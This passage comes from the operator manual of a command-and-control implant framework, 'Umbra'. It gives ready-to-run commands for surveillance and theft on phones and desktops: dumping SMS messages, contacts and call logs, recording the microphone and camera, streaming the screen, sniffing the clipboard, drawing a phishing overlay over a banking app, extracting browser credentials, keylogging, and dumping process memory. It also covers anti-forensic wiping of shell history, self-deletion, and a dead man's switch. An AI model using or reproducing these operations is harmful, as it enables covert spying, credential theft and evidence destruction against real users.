(`[::1]:8443`), the scan expands an IPv6 block, and the peer link binds an
IPv6 socket when it is asked for one.

## 3f. The implants

Four implementations of the same protocol are in the tree, and they are not
the same size. The operator picks the one that fits the host.

| Implant | Where it runs | What it carries |
|---|---|---|
| Rust (`implant/rust`) | Windows, Linux, macOS | everything: the module ecosystem, the persistence catalogue, the desktop, the pivot and the other transports |
| Kotlin (`implant/android`) | Android | the foreground service, the persistence of the phone and the tunnel; no desktop and no modules |
| Go (`implant/go`) | Linux, macOS, BSD | twenty-four task kinds and nothing else: no modules, no persistence, the link is TCP; the senses of the desktop are here too |
| Python (`operator/umbra_cli`, `tools/mock_server.py`) | the operator's machine | the reference: the console, the mock server and the vectors |

Every one of them says in its handshake which task kinds it runs, and the
server refuses to queue anything else. The list is part of the record of the
agent, so the operator sees the limits of a host before a task fails:

```
$ umbra info web-01
{
  "id": "web-01",
  "os": "linux",
  ...
  "caps": ["shell", "exec", "sysinfo", "recon", "ls", "download", "cat", "upload", "tail", "hash", "ps"],
  ...
}
```

The Go implant is the honest one about its limits: a kind it does not run
is answered with an error and not with a silence, and its self test runs a
whole cycle against a server that lives in the process, so the binary can
be proved to work before it goes near a target.

### The phone and the rules of its manufacturer

A phone is not a server, and the system of a phone is much stricter about
the applications it does not know.  The implant survives on a Redmi only
when the user of the phone has allowed it to start on its own: the boot
receiver runs once after the boot, and without the autostart permission
the system stops the application a few minutes later.

The implant cannot take that permission itself, so it says what has to be
done and where:

```bash
umbra task phone-01 --kind host.guide                 # what does the system say
umbra task phone-01 --kind host.guide --args '{"action":"show","step":"autostart"}'
```

The report has four steps, and every one of them carries the screen that
shows it:

| step | what it asks | how the phone answers |
|---|---|---|
| `battery` | the exemption from the battery optimisation | `isIgnoringBatteryOptimizations`: yes, no or unknown |
| `autostart` | the autostart list of Xiaomi | not readable by an application: the state is *unknown* and the operator looks at the screen |
| `notifications` | the permission of the notification | `areNotificationsEnabled`: yes or no |
| `standby` | the standby bucket | `getStandbyBucket`: active, working set, frequent or rare |

With `action: "show"` the phone opens the screen of a step.  A phone
blocks an application that opens a screen from the background, so the step
also travels as a notification the user can tap, and the report says
which of the two happened.

The state of the phone changes the traffic as well: a phone whose screen
is off stretches its check-in, because the screen of a phone is the
closest thing it has to the presence of a person in front of it.

### The window of the phone

The accessibility service is the one permission that turns a phone into an
input and an output for the operator.  Android keeps an enabled
accessibility service alive, so it is also a persistence technique, and it
is the loudest one: the user of the phone sees it in the settings of
Android and Android shows a notification while it runs.  The report of the
persistence says so, and the guide of the host (`host.guide`) says whether
it is on.

```bash
umbra task phone-01 --kind ui.screen                  # what is on the screen
umbra task phone-01 --kind ui.events                  # the windows that changed
umbra task phone-01 --kind ui.tap --args '{"needle":"Allow"}'
umbra task phone-01 --kind ui.text --args '{"needle":"Search","value":"proxy"}'
umbra task phone-01 --kind ui.global --args '{"action":"home"}'
```

What the operator gets with it:

* the **text of the screen** the user is looking at: the application in the
  foreground and the visible text of its window;
* the **log of the windows** that changed, with the package and the text
  that came with the event -- what the phone was used for while nobody was
  looking;
* a **hand on the phone**: press a button, write into a field, scroll, and
  the system keys (back, home, the recent apps, the notification shade).

The answers are the truth of the phone: a task that could not be done says
so instead of pretending that nothing happened, and the operator sees
whether the window accepted the action.

### The senses of the phone

A phone answers seventeen tasks that a workstation cannot answer, and
every one of them asks the user of the phone for a permission.  The
guide of the host says which of them are granted:

```bash
umbra guide phone-01                       # the steps and the permissions
umbra guide phone-01 --step permissions    # the screen of the permissions
```

The place of the phone, the networks around it and the people in it:

```bash
umbra task phone-01 --kind gps.locate      # the fix and the last known position
umbra task phone-01 --kind wifi.dump       # the networks around the phone
umbra task phone-01 --kind bluetooth.scan  # the devices around the phone
umbra task phone-01 --kind contacts.dump   # the address book
umbra task phone-01 --kind sms.dump        # the messages of the phone
umbra task phone-01 --kind call.logs       # the call log
```

The watchers wait for the phone to have something to say.  The queue is
durable and the phone connects again the moment something arrives, so the
operator polls it and reads the answer right away:

```bash
umbra task phone-01 --kind sms.watch --args '{"action":"start"}'
umbra task phone-01 --kind sms.watch --args '{"action":"poll"}'
umbra task phone-01 --kind clipboard.sniff --args '{"action":"start"}'
umbra task phone-01 --kind clipboard.sniff --args '{"action":"poll"}'
```

The ears and the eyes of the phone.  The capture is a file on the phone
and the operator pulls it with the ordinary `download` task:

```bash
umbra task phone-01 --kind media.mic --args '{"seconds":30}'
umbra task phone-01 --kind media.camera --args '{"facing":"back"}'
umbra task phone-01 --kind download --args '{"path":"/data/user/0/io.umbra.beacon/files/mic-1730000000000.m4a"}'
```

The screen of the phone.  The user has to press the button of the system
dialog, every time the capture starts:

```bash
umbra task phone-01 --kind live.screen --args '{"action":"request"}'   # the user presses it
umbra task phone-01 --kind live.screen --args '{"action":"capture"}'
umbra task phone-01 --kind ui.stream --args '{"action":"start","fps":1}'
umbra task phone-01 --kind ui.stream --args '{"action":"frames","count":5}'
```

The false screen of the phone.  The overlay waits for the application the
operator named and draws the form over it:

```bash
umbra task phone-01 --kind phish.overlay --args '{"action":"arm","package":"com.example.bank","title":"Sign in","prompt":"Please sign in to continue","fields":["username","password"]}'
umbra task phone-01 --kind phish.overlay --args '{"action":"dismiss"}'
```

The laboratory, the databases and the end of the engagement:

```bash
umbra task phone-01 --kind emulator.detect        # is this a real phone?
umbra task phone-01 --kind app.dump --args '{"package":"com.example.chat"}'
umbra task phone-01 --kind anti.forensic          # the material of the engagement goes
umbra task phone-01 --kind evade.suicide          # the implant leaves the phone
```

What the operator gets from these tasks is the truth of the phone,
including the parts the platform refused: a permission that was not
granted is reported as such, the call log of a phone that is not the
default dialler says so, and the capture of the screen says that the
user has to press the button of the system dialog.

### The senses of the desktop

A workstation answers eight tasks that a phone cannot, and the operator
asks for them with the same names on every platform:

```bash
umbra task ws-01 --kind window.list                       # the windows of the session
umbra task ws-01 --kind clipboard.watch --args '{"action":"start"}'
umbra task ws-01 --kind clipboard.watch --args '{"action":"poll"}'
umbra task ws-01 --kind screen.stream --args '{"frames":5,"fps":1}'
umbra task ws-01 --kind wifi.profiles                     # the saved networks
umbra task ws-01 --kind browser.creds                     # the accounts of the browsers
umbra task ws-01 --kind browser.creds --args '{"raw":true}'   # and the secrets
umbra task ws-01 --kind av.survey                         # the security software
umbra task ws-01 --kind usb.history                       # the USB keys
umbra task ws-01 --kind proc.memory --args '{"pid":4242}'
```

The console has a shortcut for each of them, so the operator does not
have to remember the kind and the arguments:

```bash
umbra windows ws-01                            # the windows of the session
umbra clipboard-watch ws-01 --action start     # the watcher of the clipboard
umbra clipboard-watch ws-01 --action poll      # what was copied since the last poll
umbra screen-stream ws-01 --frames 5 --fps 1  # the screen, frame by frame
umbra wifi-profiles ws-01                      # the saved networks
umbra browser-creds ws-01                      # the accounts of the browsers
umbra browser-creds ws-01 --raw                # and the secrets
umbra av-survey ws-01                          # the security software
umbra usb-history ws-01                        # the USB keys
umbra memory ws-01 4242                        # the memory of a process
```

The pictures of the screen travel as partial results, one frame at a time,
so the stream does not need one frame of the protocol to hold it.  The
dump of a process is a file in the state of the implant, and the operator
pulls it with the ordinary `download` task:

```bash
umbra task ws-01 --kind proc.memory --args '{"pid":4242}'
umbra task ws-01 --kind download --args '{"path":"/home/operator/.umbra/memory-4242-1730000000000.dmp"}'
```

The clipboard watcher keeps its queue in the state of the implant
(`~/.umbra/watch.state`), so it survives a reboot; `poll` takes what was
copied since the last poll and empties the queue of that watcher only.

What comes back is the truth of the machine.  A wireless key that belongs
to another user is not readable, a browser that is locked is not readable,
and the memory of a process of another user is not readable: the answer
says so instead of pretending that the machine has nothing to give.  The
secrets of the browsers are left out of the answer unless the operator
asks for them with `raw`.

The phone answers the same eight names with the truth of the phone: the
windows the accessibility service saw, the watcher of the clipboard, the
pictures of the media projection, the security software that is installed,
the USB devices and -- on a rooted phone -- the memory of a process.  The
saved networks of a phone and the databases of its browsers are refused
by the platform, and the answer names the reason.

### The mac is a first-class target

The Rust implant carries the whole catalogue on a mac, and the things that
have a Windows name have a mac name. The operator asks for the same thing
either way:

| The Windows way | The mac way |
|---|---|
| the registry (`HKLM\SOFTWARE\Microsoft`) | a property list (`plutil -p`), a domain of the defaults (`defaults read`) or a launchd job (`launchctl print`) |
| the screen | `screencapture` |
| the clipboard | `pbpaste` |
| the keys | an event tap (`CGEventTapCreate`), listen-only |

The `registry` task on a mac reads what it is given, in this order:

* `launchd:system/com.apple.something` is a job of the launchd domain
  (`launchctl print`),
* a key that starts with `/` is the file itself,
* every other key is the property list of the hive
  (`$HOME/Library/Preferences/<key>.plist` for `HKCU`,
  `/Library/Preferences/<key>.plist` for `HKLM`) and, when there is no such
  file, the domain of the defaults (`defaults read <key> [value]`).

```bash
umbra registry mac-01 "com.apple.Safari" --hive HKCU   # a domain of the defaults
umbra registry mac-01 launchd:system/com.apple.something # a job of launchd
umbra screenshot mac-01 screen.png                      # the screen of the mac
umbra clipboard mac-01                                 # the clipboard of the mac
umbra keylog-file mac-01 /tmp/keys.log --seconds 60    # the keys, into a file
```

The persistence of a mac is `launchd.agent`, `launchd.daemon`, `loginitem`,
`shell_rc` and `cron.user`, and the manager reads every one of them back
before it says that it is installed.

### Leaving nothing behind

Every engagement leaves something on the host: a file in the state
directory of the implant, a line in the history of the shell, a prefetch
entry, the name of the binary in the table of the processes.  The
framework knows how to survey a host, how to scrub the traces it made
and how to take the implant off the machine.  The operator asks for it
with seven commands:

```bash
umbra survey ws-01                 # what is here: every artefact and its size
umbra forensics ws-01              # the surface an analyst would find
umbra scrub ws-01 --dry-run       # what a wipe would remove, touching nothing
umbra scrub ws-01 --what state,history   # remove the state and scrub the history
umbra verify ws-01                # what is left, and what cannot be reached
umbra journal ws-01 --on          # the timeline of the engagement on the host
umbra vanish ws-01                # the implant leaves the host
umbra decommission ws-01          # the end of the engagement on the host
```

**The order matters.**  `decommission` is not a list of deletions but a
sequence, and the sequence is the one that leaves nothing behind:

1. the watchers stop first -- they would write into the state that is
   about to go;
2. the persistence entries are taken away -- a start-up entry that points
   at a missing binary is a trace worse than the entry itself;
3. the traces are wiped: the state, the journal, the caches, the history
   of the shell, the list of the recent files;
4. the binary goes: a child waits for the process and removes it, and on
   Windows the deletion is handed to the session manager;
5. the verification closes the report.

The answer travels **before** the implant leaves, so the operator reads
what was removed and what was not.

**The history of the user is scrubbed, never deleted.**  The lines of
`.bash_history` that mention the implant are taken out; the rest of the
file stays.  The same holds for the recent files and for the trash: the
implant is removed from them, not the user.

**A limit is a limit.**  The report names the things no process of a user
can reach -- the MFT and the USN journal of Windows, `utmp`, `wtmp` and
`btmp` on a POSIX host, the free blocks of the disk, the swap, the buffer
of the system log, the statistics of the use, the backups of the cloud --
and says why they are out of reach.  A host that carries a deleted file in
its free space is not a clean host, and the report does not pretend that
it is.

**The journal is off until the operator asks for it.**  An implant that
writes a record of its own actions carries evidence that it does not
need to carry.  `umbra journal ws-01 --on` turns it on, the timeline
answers what the implant did on that host, and the wipe removes the
journal like any other artefact.

**The end of an engagement is the work of an admin.**  `vanish` and
`decommission` are refused to everybody but an admin, and they are
refused whichever path they travel: the dedicated command, `task.submit`,
`task.bulk`, `task.chain`, `schedule.add` and `alias.run` are one door.
The console asks twice before it destroys anything.

**The dead man's switch.**  An implant that outlives its engagement is an
implant nobody is watching.  The operator arms a window and every
check-in renews it; when the team goes quiet for longer than the window
the implant wipes its traces, takes its persistence with it and leaves:

```bash
umbra deadman ws-01 --minutes 720      # twelve hours of silence, then the end
umbra deadman ws-01 --minutes 0        # the switch is disarmed
```

The window lives in the state directory of the implant, so a reboot does
not disarm it, and arming it is an admin command: it is the end of an
engagement waiting to happen.

**The proof outlives the host.**  Every report of the wipe carries the
signature of the implant: the HMAC of the report under the key of the
agent and the label `umbra/w1/attest`.  The server checks the signature
and writes `attested: true` in the metadata of the task, so the record of
what was removed stays readable after the host is gone.

**The machine of the operator is a host too.**  The notebook of the
console, the exports, the downloads and the commands that were typed
into the shell are traces of the engagement, and the end of an
engagement takes them away:

```bash
umbra clean --dry-run         # what would go: nothing is touched
umbra clean                   # the notebook and the lines of the console
```

The history is **scrubbed**, never deleted: the lines that name the
console (or the address of the server) go, the rest of the file stays.
The notebook goes as a whole, because a notebook with holes in it is
worse than no notebook.  The ledger of the server is not touched: it is
the record of the engagement, not a trace of it -- ship it off the box
instead.

**A fleet is wiped host by host.**  The seven commands take one host or a
group of them, and the console walks the group: the survey, the wipe and
the verification of every host, one after the other, so the operator sees
the host that did not answer instead of a promise.

```bash
umbra cleanup --filter state=online --what state,history,cache
```

### A key for every host

The fleet key is a key of everybody: whoever holds it may claim any name.
The server also takes keys that belong to one agent, and a beacon that
proves such a key may not claim another name -- the server refuses the
handshake, so a key that is stolen impersonates one machine and not the
whole fleet.

The keys come from the environment, one pair per host, separated by
commas:

```bash
export UMBRA_AGENT_KEYS="web-01:8f3c...d21a,db-01:41b7...90ce"
```

The server reads the variable named in `agent_key_env` (the default is
`UMBRA_AGENT_KEYS`), and the beacon is built with the same key and the
same identity.  The Rust beacon takes the key and the identity from the
environment, so the same pair is written in one place:

```bash
UMBRA_AGENT_ID=web-01 UMBRA_PSK=8f3c...d21a cargo build --release
```

The phone takes them from the build (`UMBRA_AGENT_ID` and `UMBRA_PSK_HEX`
in `app/build.gradle`), because an application on a phone cannot be given
an environment at runtime.

The fleet key keeps working for the beacons that were built before this
option existed, so the fleet can be moved one host at a time.

## 4. Beacon tuning

The server dictates cadence at handshake time (`beacon.sleep` / `beacon.jitter`)
and can change it per agent with `agents.policy` (or the older
`agents.sleep`); the implant applies it immediately on the next check-in and
keeps it until it is told otherwise.

```bash
umbra policy web-01 --sleep 120 --jitter 45
umbra policy --all --state online --sleep 300 --jitter 50
umbra policy web-01 --no-obfuscate     # a fixed interval, no jitter nap
```

The cadence belongs to the operator: a beacon that has not applied a pushed
policy yet still reports its old interval, and that report never overwrites
the policy.  The obfuscation flag travels with the policy (the default is on,
so an agent keeps hiding its check-in pattern unless it is told otherwise).

| Environment | sleep | jitter |
|---|---|---|
| Lab / LAN | 5 s | 20 % |
| Typical engagement | 60 s | 35 % |
| Low-and-slow | 900 s | 50 % |

Sleep and jitter are clamped server-side (1–86400 s, 0–90 %). Failed cycles back
off exponentially up to 5 minutes, so a beacon never hammers a dead server.

## 5. State and recovery

* `data_file` holds agents and the task history (JSON). It is written after
  every state change, but bursts are coalesced into one write, and there is a
  periodic snapshot every 30 s as a backstop, plus a final write on shutdown.
  Each write goes to a fresh `*.tmp` in the same directory, is fsynced, and is
  renamed over the target, so the file on disk is always a complete snapshot
  (concurrent saves are serialised; a reader never sees a half-written file).
* Two generations on disk: before the new file is renamed into place, the
  current one becomes `data_file.bak`. A crash inside that window leaves no
  primary at all, so startup falls back to the backup and logs
  `state recovered from the backup generation` — the last few seconds of state
  are gone, the engagement is not. A torn or non-snapshot primary is treated the
  same way. `{}` or a file from a newer schema is refused instead of being
  loaded (and then overwritten) as an empty engagement.
* Anything that was `delivered` when the server stopped is re-queued on start, so
  a crash cannot lose a task — at the cost of possibly executing it twice. Task
  kinds are not idempotent by default, so check `task.list` after a restart.
* History is capped at 20 000 tasks (oldest completed tasks are pruned).
* A task that was delivered but never answered is failed after
  `task_timeout_s` (default 300 s, `0` disables it) and the consoles get a
  `task.timeout` event.  The task is **not** queued again: a task that may
  have run must not run a second time, so the operator decides what happens
  next.
* To reset an engagement: `umbra wipe` clears the agents, the tasks and the
  schedules on the server, and the audit trail keeps the numbers.  The
  implants are **not** touched: they are still out there, so remove them
  first.  A full reset (the file, the keys, everything) means: stop the
  server, delete `data_file`, **and rotate the agent PSK and operator
  tokens** (delete the implants or they will simply re-register).
* To end an engagement on the *target* side: `umbra panic` queues the exit
  task for the selected agents and marks them as burned, so the server
  refuses every further task for them — work that is queued while the
  operator is still cleaning up never reaches the machine.  The exit is a
  task, not a pushed frame, so an implant that sleeps for an hour gets it
  on its next check-in and dies then.  `umbra panic --all` reaches every
  agent the server knows, the sleeping ones included.  The console asks for
  the word "panic" before it does any of this, and the command is an admin
  action, so it is in the audit trail.
* A beacon that says which task kinds it implements is never asked for
  anything else: the server refuses the task and names the kind, instead of
  delivering a command the host cannot run.  The list is in the inventory
  (`umbra agents --json`), and it is what tells an operator that a host is
  out of scope before the command is written.

## 5a. The operator's notebook

The team server keeps the authoritative state. The console keeps a second,
local copy of the part of the history that belongs to the operator: the tasks
they ran, the results they collected and the notes they left for the team.
It is a single SQLite file, `~/.umbra/state.db` by default.

```bash
umbra db stats                     # how much is in the notebook
umbra db tasks                     # the tasks this console submitted
umbra db tasks --agent web-01      # only the ones for one implant
umbra db results <task-id>         # the output of one task
umbra db search "shadow"           # search arguments, notes and output
umbra db note "the DC is dc01.corp.example" --agent web-01
umbra db export engagement.json     # a portable copy of the notebook
```

The notebook needs no server and no token: `umbra db ...` works offline, which
is exactly what an operator wants when the server is down or when the
question is about something that happened yesterday.

Two properties matter:

* **no secrets.** The operator token, the agent PSK and the session keys stay
  in memory. The notebook holds task metadata and task output — the same
  material the server already stores — and nothing else.
* **the operator owns it.** The file is not part of the server state, is not
  synchronised with the team, and is not touched by anybody else. Deleting it
  loses nothing the server does not have.

The path is configurable with `--db` or `UMBRA_DB`; an empty value switches
the notebook off entirely.

## 5b. Audit trail

Every operator command is appended to `audit_file` as one JSON object per line,
before the reply is sent:

```json
{"at":"2026-10-26T09:14:03.511Z","operator":"alice","peer":"10.0.0.5:51822","transport":"tcp/operator","cmd":"task.submit","ok":true,"agent_id":"web-01","task_id":"t-9f3a","detail":"map[cmd:id kind:shell]","ms":2}
```

* Written with `O_APPEND` + `fsync` per line over a `0600` file: a line that is
  lost in a crash would defeat the point.
* Lives next to the state file (`/var/lib/umbra/audit.jsonl` in the shipped
  unit) because that is the only directory the unit can write to
  (`ProtectSystem=strict`). Ship it off-box: a server that can rewrite its own
  audit log is not an audit log.
* `audit_max_mb` (default 8) rotates the file to `*.1`…`*.5`; old files are
  never truncated in place.
* Free-form fields (arguments, errors) are clipped to 512 characters, so one
  huge `--args` blob cannot make a line unbounded.
* An audit write failure is logged and the RPC still completes — a full disk
  must not stop an engagement, but it must be visible in `journalctl`.
* Every entry carries the hash of the entry before it, so the ledger is a
  chain: a line that was edited, removed or added after the fact breaks
  every link after it.  `umbra audit --verify` walks the chain and says
  which line broke it; the head of the chain is the proof of the whole
  ledger and can be written down or given to a third party.
* Read it back with `umbra audit --limit 20` (newest first), or from the file:

```bash
umbra audit --verify                    # is the ledger intact?
jq -c 'select(.ok == false)' data/audit.jsonl | tail
jq -r '[.at, .operator, .cmd] | @tsv' data/audit.jsonl | tail -20
```

Setting `audit_file` to `""` disables auditing; the server logs a warning at
start-up when it is off, and `umbra audit` says so instead of showing an empty
list. On a real engagement, treat the audit file as evidence: ship it off the
server, and do not give operators write access to it.

## 5c. Roles

Operator identities are configured with a role:

```bash
# /etc/umbra/server.env
UMBRA_OPERATOR_TOKENS=alice:admin:b0a1…,bob:operator:7c2e…,carol:viewer:91fd…
```

`name:token` (the old form) still works and defaults to `operator`. There must be
at least one `admin`, or the server refuses to start — otherwise nobody can
manage the engagement.

| Role | Can |
|---|---|
| `viewer` | read agents, tasks, results, audit, operators, chat, schedules, and the artifact store |
| `operator` | everything a viewer can, plus submit/cancel tasks, change beacon cadence, kill, chat, add schedules, fill and push the artifact store |
| `admin` | everything, plus remove schedules, panic an engagement and other engagement-wide actions |

`umbra whoami` prints your role and the exact command list it allows, and the
console refuses locally what the server would refuse anyway. A refusal is
audited (`ok=false`, `err` starting with `permission denied`), so "who tried
what" includes what they were not allowed to do.

## 5d. Chat and recurring tasks

* `umbra chat hello team` / `umbra chat` — the last 200 messages are kept in
  memory and every console receives them as a `chat` event.
* `umbra schedule add web-01 sysinfo --every 300` creates a recurring task;
  `umbra schedule list` shows the next run, the run count and who created it;
  `umbra schedule rm <id>` deletes it. Schedules are persisted with the state
  file, so a restart does not stop a collection run. The interval is clamped to
  5–86400 s, and a schedule that came due while the server was down fires once,
  not once per missed interval.

## 5e. Working as a team

The server is shared state: everything one console does is visible to the
others, and three small mechanisms keep a team from stepping on each other.

* **Who is where** — `umbra operators` lists every connected console with its
  role, the agent it is focused on, how long it has been idle and how deep its
  event queue is. The interactive console announces your focus automatically on
  `use <agent>`; `umbra focus web-01` (or `focus` to clear) does it from a
  script. Teammates see an `operator.focus` event.
* **Claims** — before working a task that someone else might grab, run
  `umbra claim <task-id>`. `umbra tasks` then shows `CLAIMED BY`, `task.claim`
  refuses a second operator with `task is claimed by <name>`, and
  `umbra release <task-id>` frees it. A claim orders people, it does not gate
  the task: the beacon never waits for one, and a finished task cannot be
  claimed. Claims survive a restart with the task itself.
* **Directed chat** — `umbra chat --to bob "web-01 is staged"` (or
  `chat @bob …` in the console) pushes the line only to Bob's console and your
  own. The history stays shared and shows the recipient, because a shared
  engagement needs a shared record: treat it as addressing, not encryption.

## 5e.1 The presence, the lease and the handover

Three more things keep a team from fighting itself.

* **The presence expires** — a console that stops talking for ninety seconds
  is *silent*, and after two minutes it is *stale*: the socket may still be
  open, but the team does not wait for it any more. `umbra operators` and
  `umbra chat --operators` both show it, so a colleague that is gone looks
  gone instead of busy.
* **A claim has a lease** — the promise that somebody is working on a task
  only lasts as long as the presence behind it. When the holder goes stale the
  claim expires, the task becomes available again and the team is told. The
  task row carries `CLAIMED BY`, the age of the claim and whether it is still
  live.
* **An assignment is a handover** — `umbra assign <task-id> bob` says who is
  expected to work on a task; it does not stop anybody else from taking it.
  Bob sees it in `umbra inbox`, and the team sees a `task.assigned` event.
* **The namespace is shared** — `umbra alias add` writes a command that
  everybody uses, and the list says who wrote it and when. The namespace is
  kept next to the state file, so the template one operator wrote is there
  for the next one and for the next run of the server. The schedules and
  the alert rules work the same way: the change is an event, and the audit
  trail keeps it.
* **The handover** — `umbra handover --out handover.md` writes the document a
  colleague reads when you go home: the inventory, the open work, the
  findings of the reconnaissance, the persistence, the open sessions, the
  artefacts, the team and the last moves of the journal, plus the notes of
  your own notebook.

The chat never reaches the implants: the stream the agents read carries
tasks and results, never a word of the team.

## 5f. File transfer

```bash
umbra --server 127.0.0.1:4002 --operator alice download web-01 /etc/passwd ./passwd
umbra --server 127.0.0.1:4002 --operator alice upload   web-01 ./collector /tmp/collector
```

Inside the console the same commands are `get <remote> <local>` and
`put <local> <remote>` for the selected agent. Both are chunked at 900 KiB, the
largest payload that still fits in one frame, so arbitrary file sizes work
without a new message type or a second connection:

* every chunk is checked against the SHA-256 the beacon reports;
* downloads are written to `<local>.part` and renamed only after the last chunk
  and the size check pass, so a failed transfer never leaves a truncated file
  that looks complete;
* uploads truncate at offset 0 and report the whole-file hash on the final
  chunk, which the CLI compares with the local file;
* `--chunk` lowers the step size (useful on lossy links); `--timeout` applies
  per chunk, not to the whole transfer.

A transfer is a sequence of ordinary tasks, so it appears in `tasks`, in the
audit trail and in the cancel path like anything else. The beacon reports
`total`, `offset`, `eof` and `sha256` in each RESULT, and the server stores them
as task metadata that `result <task-id>` prints.

## 5g. The operator's experience

The console is the product; the server is its engine. This is what the
console does for the operator who lives in it.

### The shell

The prompt says what the console is looking at right now:

```
umbra[web-01 · 2/3 online · queue 4 · sleep 30s]>
```

The history is kept in `~/.umbra/history`, so the last session is where the
next one starts. The completion knows the commands and the agents by name:
`work` becomes `workflow`, and `use web-` becomes `use web-01`. A command
may be written over several lines: a line with an open quote or bracket is
continued with `... `, so a long JSON argument is written the way it is
read.

### One task, many agents

```bash
umbra run --group dc --group web --kind sysinfo --cap 8 --wait
```

The filter language is the one the server speaks, so the selection is
written once and used for finding agents and for acting on them. The cap
is how many answers are waited for at the same time; the progress line
shows what is coming back, and the table at the end says what every host
answered.

### The plan

A plan file is a workflow written in a small YAML subset (JSON is a plan
too):

```yaml
name: sweep
params: [target]
steps:
  - kind: task
    agent: "{{target}}"
    task_kind: shell
    args:
      cmd: "systeminfo"
  - kind: wait
    seconds: 5
  - kind: report
    title: The sweep
```

```bash
umbra batch --file sweep.yaml --param target=web-01     # run it here, now
umbra workflow add sweep --file sweep.yaml              # save it for the team
umbra workflow run sweep --param target=web-01 --wait   # run it on the server
```

The plan reader lives in the console and reads the subset itself: no YAML
library, no dependency, no surprise. A plan that is not a plan is refused
with the line that is wrong.

### The raw command line

```bash
umbra rpc task.list '{"agent": "web-01"}'
umbra rpc task.submit --arg id=web-01 --arg kind=shell --arg args='{"cmd":"id"}'
```

`umbra rpc` is the escape hatch: every command the server understands is
reachable from the shell, and `--json` makes the answer machine-readable.
The shapes of the answers are documented in `docs/PROTOCOL.md`.

### The notebook

The notebook (`~/.umbra/state.db`) holds what the operator collected: the
sessions, the tasks, the answers, the notes, the findings of the
reconnaissance, the artefacts that were pulled off a host, the screenshots
and the material. Everything in it is searchable (`umbra db search admin`),
and it is written either as JSON or as the Markdown document an operator
hands over (`umbra db export --out notebook.md`).

The notebook is the operator's own file on the operator's own disk, and it
holds the value of the material that was collected. Treat it like the
notebook it is: do not leave it in a shared directory, and do not put it in
a ticket.

## 5h. The queue, the breakers and the metrics

### The queue is predictable

The queue of the server is the part an operator trusts last and needs
first. Four things decide what happens when there is more work than the
hosts can take:

| rule | what it does | the key |
|---|---|---|
| **the priority** | the urgent task goes first; the rest keeps its order, so nothing starves | `umbra priority <task-id> 10` |
| **the work in flight** | a host that is already busy is not given more work | `queue.max_in_flight_per_agent` |
| **the rate of the host** | one host receives work at a bounded rate | `queue.max_deliver_per_minute_per_agent` |
| **the throughput of the server** | the whole server hands out a bounded number of tasks per second | `queue.max_deliver_per_second` |

```bash
umbra --server 127.0.0.1:4002 --operator alice priority t-9f3a 10
umbra --server 127.0.0.1:4002 --operator alice queue
```

### The dead letter queue

A task that fails too many times (`queue.max_attempts`, three by default)
is **not** run again: a task that may have run must not run a second time
without a decision. It goes to the dead letter queue, where it stays
visible with the reason and the trace.

```bash
umbra --server 127.0.0.1:4002 --operator alice queue
```

### The circuit breaker

A host that fails too many times in a row (`queue.breaker_threshold`,
five by default) has its breaker opened: the server stops handing work to
it. After the cooldown (`queue.breaker_cooldown_s`, sixty seconds) one
probe goes through, and the answer of the probe decides whether the
breaker stays open. A host that is really gone is a host that should not
be given work.

### The maintenance window

```bash
umbra --server 127.0.0.1:4002 --operator alice quiet on --until 1780000000
```

The beacons keep checking in and get nothing; nothing new is queued. The
window ends by itself, or with `quiet off`. The change is an event and an
audit line.

### The trace

Every task carries a trace id from the RPC that queued it to the result
that came back:

```bash
umbra --server 127.0.0.1:4002 --operator alice tasks --trace 4f2a9c11
```

The trace is in the task record, in the events and in the audit trail, so
one identifier follows the work from the operator to the implant and back.

### The metrics

The dashboard serves the counters of the server in the Prometheus text
format.  The dashboard is off in the deployed configuration — it is a
wide surface ✗ — so a deployment that wants the metrics turns it on, on
the loopback, with a token of its own:

```json
{"dashboard_listen": "127.0.0.1:4004", "dashboard_token": "<32 bytes of hex>"}
```

```bash
curl -H "Authorization: Bearer $TOKEN" http://127.0.0.1:4004/metrics
```

| metric | what it is |
|---|---|
| `umbra_agents`, `umbra_agents_online` | the inventory and how much of it answers |
| `umbra_tasks_pending`, `umbra_tasks_done`, `umbra_tasks_failed`, `umbra_tasks_dead_letter` | the queue and its outcome |
| `umbra_task_latency_seconds` | the histogram: how long a task took between the delivery and the result |
| `umbra_checkins_total` | how often the beacons check in |
| `umbra_agents_by_transport` | the transport mix |
| `umbra_bytes_in_total`, `umbra_bytes_out_total` | the bytes that moved |
| `umbra_operators` | the consoles that are connected |
| `umbra_events_dropped_total` | the events a console missed |
| `umbra_breakers_open` | the hosts whose breaker is open |
| `umbra_quiet` | one when the server is in its maintenance window |

The health check needs no token, and says nothing but that the process is
alive: `GET /healthz`.

## 5i. The versions, and what to do when a host is old

The server speaks two handshake versions at the same time and answers in
the version the peer asked for, so a beacon that was built before the
second version keeps working.  The matrix is in the protocol document
(§5.1); what the operator sees is the `hello_version` of every host in
the inventory.

```bash
umbra --server 127.0.0.1:4002 --operator alice agents
```

| `hello_version` | what the host speaks | what to do |
|---|---|---|
| 2 | the second handshake: the capability list, the implant version, the module ABI and the platform details | nothing |
| 1 | the first handshake: the capability list is inside the metadata | nothing; it still works |
| 0 | a host that never said | the server refused the handshake |

A host that is still on the first version does not send heartbeats, so
the inventory shows no heartbeat for it.  That is the only difference
an operator sees.

## 5j. Rotating the credentials without a restart

The credentials of the server can be replaced while it runs.  The old one
keeps working for thirty minutes, so nothing that is asleep is locked out.

```bash
# The key the beacons authenticate with.  The answer holds the new key.
umbra --server 127.0.0.1:4002 --operator alice keys rotate

# A key the operator brings, from a key management system.  The file
# keeps the secret out of the process list.
umbra --server 127.0.0.1:4002 --operator alice keys rotate \
    --psk-file /etc/umbra/agent.psk

# The token of one operator, narrowed to what it may do.
umbra --server 127.0.0.1:4002 --operator alice tokens rotate bob \
    --role operator --scope agents.list --scope server.stats

# The state of every token: the role, the scopes, the expiry, the last use.
umbra --server 127.0.0.1:4002 --operator alice tokens list
```

**The order of a rotation.**  The new agent key has to reach the beacons:
write it into their configuration (or into the route the server pushes) and
let them check in again.  The old key works until the overlap is over, so
there is no rush — but the old key must not stay in the configuration of
the fleet for longer than the overlap.

**The scopes are a promise.**  A token with scopes may call what is in
the list and what its role allows, and nothing else.  Give an analyst
the scopes `agents.list`, `task.list` and `audit.tail`, and nothing
else.  The scopes are read on every call, so taking one away takes
effect at once — the console that is already connected loses it too.

**The expiry.**  `tokens.rotate` takes a unix time; a token that has
expired is refused at the handshake, not at the first call.

**The role is not changed by accident.**  `tokens.rotate` without a
`--role` keeps the role the operator already had.  A rotation that
quietly demoted an admin to an operator would be a surprise of the
worst kind.

## 5k. The hunt: the indicators of the team

A wipe takes the traces of *our* engagement away; a hunt looks for the
